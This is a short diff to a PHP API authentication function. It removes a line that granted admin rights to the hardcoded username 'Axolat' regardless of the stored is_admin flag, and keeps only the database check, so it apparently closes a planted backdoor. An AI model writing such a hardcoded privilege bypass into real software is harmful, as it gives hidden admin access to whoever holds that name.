@@ -158,7 +158,7 @@ function authenticate_api_user($db) {
         return [
             'id' => $user['id'],
             'username' => $user['username'],
-            'is_admin' => (isset($user['is_admin']) && $user['is_admin'] == 1) || ($user['username'] === 'Axolat')
+            'is_admin' => isset($user['is_admin']) && $user['is_admin'] == 1
         ];
     }
     return false;
